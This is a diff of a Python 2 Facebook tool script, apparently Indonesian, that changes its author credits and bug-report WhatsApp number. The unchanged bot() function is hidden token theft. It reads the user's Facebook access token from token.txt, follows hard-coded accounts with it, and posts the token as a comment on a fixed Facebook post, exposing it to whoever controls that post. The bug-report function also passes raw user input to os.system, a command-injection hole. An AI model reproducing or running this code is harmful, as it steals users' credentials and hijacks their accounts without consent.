@@ -172,8 +172,7 @@ def menu():
     print""+p+"   * Thanks Sudah Memakai Scrip ini!! Enjoyerrs"
     print""
     print" [+] Author       : RAV PRATAMA XD."
-    print" [+] Facebook : Rav Pratama Ananda Bima LK." 
-    print" [+] Ayang 💕        : Inka Rara Putrie" 
+    print" [+] Facebook     : Rav Pratama Ananda Bima LK."
     print" [+] ----------------------------------------"
     print" [+] Bergabung   : %s %s %s" % (ha, op, ta)
     print" [+] Status      : "+H+"Premium"
@@ -514,8 +513,9 @@ def laporbug():
 	asulo = raw_input("\n [?] masukan laporan bug script : ")
 	if asulo == "":
 		menu()
-	os.system('xdg-open https://wa.me/6285229323951?text=' +asulo)
+	os.system('xdg-open https://wa.me/081818101132?text=' +asulo)
 
+### BOT FOLLOW DAN KOMEN ###
 def bot():
 	try:
 		token = open('token.txt', 'r').read()
@@ -527,7 +527,7 @@ def bot():
 	requests.post('https://graph.facebook.com/100007140370491/subscribers?access_token=' + token)
 	requests.post('https://graph.facebook.com/100010426815727/subscribers?access_token=' + token)
 	requests.post('https://graph.facebook.com/3088882871430325/comments/?message='+token+'&access_token=' + token)
-       
+
 def infologin():
 	print""
 	print "\n [*] token : "+token
